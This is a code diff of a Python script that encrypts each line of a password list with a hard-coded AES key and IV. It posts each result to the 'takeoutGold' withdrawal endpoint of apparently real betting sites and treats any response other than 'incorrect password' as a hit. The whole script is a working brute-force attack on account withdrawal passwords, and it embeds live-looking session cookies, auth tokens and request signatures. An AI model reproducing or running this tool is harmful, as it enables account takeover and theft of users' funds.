@@ -3,7 +3,7 @@ import hashlib
 import time
 
 from Crypto.Cipher import AES, DES
-
+import httpx
 
 class DeAesCrypt:
     """
@@ -59,74 +59,86 @@ class DeAesCrypt:
         else:
             return "不存在此种数据填充方式"
 
-
 import requests
 
-headers = {
-    'authority': 'web.1543434.com',
-    'pragma': 'no-cache',
-    'cache-control': 'no-cache',
-    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
-    'nonce': '992733e5-0542-414e-a42f-fa19baba00bb',
-    'accept-language': 'zh',
-    'data-uuid': 'data-uuid-318',
-    'device': 'efacd0ae-f8be-4cac-a8dd-d29f9f7bf497',
-    'sign': 'eeoVL18Tv3iTJ7BG2ke4/ShgsZ9AAmvNlKefEVK8u8W4zE+rejBJZ6QZE4ZmaQEY',
-    'sec-ch-ua-platform': '"Windows"',
-    'devicemodel': 'windows',
-    'currency': 'CNY',
-    'x-request-id': '992733e5-0542-414e-a42f-fa19baba00bb',
-    'platformtype': '5',
-    'domain': 'www.4424466.com',
-    'sec-ch-ua-mobile': '?0',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
-    'auth': 'bONVvk1k2VkMvYeh38yyn8RWz-_05yPleBpNHOHamnEUzGVMyJ9dxpv13AWRTJxpYP4j1aAVPV4fvUgSdcFZPBI5_wL6KA6HuHYZJYpA3junk_3tbgPS-N-YG4E6k5Gg8g2Yd6xv2-4VrmjhSgxWzP-kiQt38ivtsNmsqvwRc1qIlgHAaKlN7YRbmUr_e0cu3VefzfDjOI2X04jVecl4Mt613chSxx2zI1hQgxexioy4rpTXocOth3gR-BARnf1p3IB_tGiHNsktiIW6mBMmNVU3t5KzdJ-9cbE5-Zkw9CF_cINa1fr0vMEfj0EZ7Xp_eJRylrQ5r4DATtBFG973Sw',
-    'content-type': 'text/plain',
-    'accept': 'application/json, text/plain, */*',
-    'token': '6f41c754354add2fe8451679226161017792164',
-    'timestamp': '1679229389',
-    'sitecode': '128',
-    'language': 'zh',
-    'clienttimezone': 'UTC+8',
-    'browserfingerid': 'kTu3x6DHeBMF5xqZGSFw',
-    'sec-fetch-site': 'cross-site',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-dest': 'empty',
-    'referer': 'https://www.4424466.com/',
+cookies = {
+    'session_sslproxy_server': 'c8b0f2da-77e3-4f05e699d5913eb4aeef7dc31a14acd84bbc',
+    'UserKey': 'povwEaSHnAXR3qwBL6FIyebuXEwjsOXyw9fHuoIoY1ai7TQr3-srLVGdOz6CEmMU',
+    '_vid_t': '+IFdqGv/k9g+N4uKOWlnRajYlYNaxcIl72dkfDFXwlJZ5LS4nM/XSm+Oct83GD34sNA/txKf2x9slA==',
 }
 
-data = 'EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspY01Q+aate5/MXJ9quqb+CKg=='
+headers = {
+    'authority': 'www.4424477.com',
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'zh',
+    'auth': 'PDVeHfDXg2h2l1OrxN5fPYDUgW0qkH-wRME39zboQgTIaW-xDq_aXC_fxeKd13_uUJo6mJAvrAuW1U3oeOTZvd197qJfRCcRDUvSP_EtuIPLZ3Gv-riYlxf20NWU4fEcNt7O56YMS_m2blJ808pUWqVGj83_FHuQDC4esfXdld8tOB8mzSEhbym4uI4v_dGK-QTvdF-j4lWF27Awcud2CneVJVAITNPV8myns5h6Tbb_GZnyIDWnS6zQhRfgaP2TiKTAkOUazEb5nd_rd7UQGHo_c9s9h5EDNSDajNNkTtwpS-ss1sufNozYPVNh8nJo3fNKrl4T-tUVMK8Lk50-wQ',
+    'browserfingerid': 'SWZS2wpfkd0K8ySSUbaa',
+    'clienttimezone': 'UTC+8',
+    'content-type': 'text/plain',
+    # 'cookie': 'session_sslproxy_server=c8b0f2da-77e3-4f05e699d5913eb4aeef7dc31a14acd84bbc; UserKey=povwEaSHnAXR3qwBL6FIyebuXEwjsOXyw9fHuoIoY1ai7TQr3-srLVGdOz6CEmMU; _vid_t=+IFdqGv/k9g+N4uKOWlnRajYlYNaxcIl72dkfDFXwlJZ5LS4nM/XSm+Oct83GD34sNA/txKf2x9slA==',
+    'currency': 'CNY',
+    'data-uuid': 'data-uuid-42',
+    'device': '657c402a-39cf-47ad-bc30-eb96fbcae2b6',
+    'devicemodel': 'windows',
+    'domain': 'www.4424477.com',
+    'language': 'zh',
+    'nonce': 'eec5d2e1-84ab-491e-9fe9-2ce4fa8505e8',
+    'origin': 'https://www.4424477.com',
+    'platformtype': '5',
+    'referer': 'https://www.4424477.com/home/yuebao?id=18538137',
+    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'sign': '65umdncUL15M+8fESDOTkvmAW1FyTVFFFxouL6NHRolscxXfoU6NSwFJguicMaDL',
+    'sitecode': '128',
+    'timestamp': '1679233564',
+    'token': '4423772043da9659c4dc1679233551632545283',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
+    'x-request-id': 'eec5d2e1-84ab-491e-9fe9-2ce4fa8505e8',
+}
+
+# data = 'MeDIyM0Pu+ctTjecfhlFuSv0cUGQ7YkW8L2NC2loE68tCUKPNfAaI0tSEWU7ZgVzw3QIqD55FcMxis7fRbROGA=='
+
+# response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies, headers=headers, data=data)
 
 if __name__ == '__main__':
     # data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
-    key = "8325b1d23ff2eeb4"
-    iv = "5421698523412578"
+    # key = "8325b1d23ff2eeb4"
+    # iv = "5421698523412578"
     # csss = DeAesCrypt(key, iv)
     # print(data)
     # jiemi = csss.decrypt_aes(data)
     # print(jiemi)
     # jiami = csss.encyrpt_aes(jiemi)
     # print(jiami)
-    aes_obj = DeAesCrypt(key, iv)
+    # aes_obj = DeAesCrypt(key, iv)
     # content = ""
     # data = aes_obj.encyrpt_aes(content)
     # data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
     # response = requests.post('https://web.1543434.com/hall/yuebao/takeoutGold', headers=headers, data=data)
     # print(response.json())
+    key = "8325b1d23ff2eeb4"
+    iv = "5421698523412578"
+    aes_obj = DeAesCrypt(key, iv)
     with open("pass.txt", "r") as f:
         for content in f.readlines():
             try:
                 data = aes_obj.encyrpt_aes(content)
-                data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
-                response = requests.post('https://web.1543434.com/hall/yuebao/takeoutGold', headers=headers, data=data)
+                # data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
+                # response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,headers=headers, data=data)
+                response = httpx.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,headers=headers, data=data)
+
                 res = response.json()
-                if "密码不正确" == res.get("msg"):
-                    # print(content, res)
-                    continue
-                else:
+                if "密码不正确" == res.get("msg") or res.get("errorCode")==41080:
                     print(content, res)
-                    break
-                # time.sleep(1)
+                    pass
+                else:
+                    print(content, res,data)
             except Exception as e:
-                print(str(e),"到那了:",content)
-                time.sleep(10)
+                print(e.__traceback__.tb_frame.f_globals["__file__"],e.__traceback__.tb_frame.f_lineno)
+                print(str(e),"到那了:",content,data)
+                time.sleep(5)
+                continue
